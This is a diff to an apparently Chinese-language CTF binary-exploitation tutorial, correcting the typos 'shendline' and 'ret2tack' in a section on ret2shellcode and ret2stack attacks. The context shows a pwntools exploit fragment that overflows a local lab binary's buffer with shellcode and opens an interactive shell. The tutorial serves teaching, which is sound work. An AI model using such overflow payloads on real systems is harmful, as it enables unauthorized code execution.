@@ -1012,11 +1012,11 @@ int main() {
    payload = shellcode.ljust(112, b'A') + p32(buf2_addr)
    
    io = process('./ret2shellcode')
-   io.shendline(payload)
+   io.sendline(payload)
    io.interactive()
    ```
 
-### ret2tack
+### ret2stack
 
 虽然由于各种保护措施，栈可执行的题目一般不会碰到，但还是有必要了解相关攻击方法，现在我们自己写一个相关题目进行攻击
 
